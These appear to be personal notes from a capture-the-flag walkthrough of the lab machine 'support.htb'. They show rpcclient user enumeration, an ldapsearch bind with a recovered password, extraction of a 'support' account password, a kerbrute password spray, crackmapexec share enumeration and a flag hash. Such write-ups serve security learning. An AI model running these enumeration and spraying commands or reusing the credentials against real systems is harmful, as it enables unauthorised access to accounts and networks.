
Able to get a list of user through rpc
```
rpcclient -U "ldap" 10.10.11.174
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

```
rpcclient $> enumdomusers
Administrator
Guest 
krbtgt
ldap 
support 
smith.rosario
hernandez.stanley
wilson.shelby 
anderson.damian
thomas.raphael 
levine.leopoldo 
raven.clifton
bardot.mary 
cromwell.gerard 
monroe.david 
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

With little tweak i was able to run the ldapsearch command
```
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'
```
![[Pasted image 20231121224813.png]]

Now on doing enumerating on the ldap result we were able to get a passwd i think
I used gedit and search CN=support or we can also use cat and grep but didn't get the info in result
```
support
Ironside47pleasure40Watchful
```
![[Pasted image 20231121230414.png]]


I have to check the login and passwd if we can login or not 
```
kerbrute passwordspray -d support.htb --dc 10.10.11.174 user.txt -t 100 Ironside47pleasure40Watchful
```
![[Pasted image 20231121230700.png]]

```
cme smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful' --shares
```
![[Pasted image 20231121230951.png]]

```
7876c661f1a76c8ca81644f50ec85a1a
```
![[Pasted image 20231121231237.png]]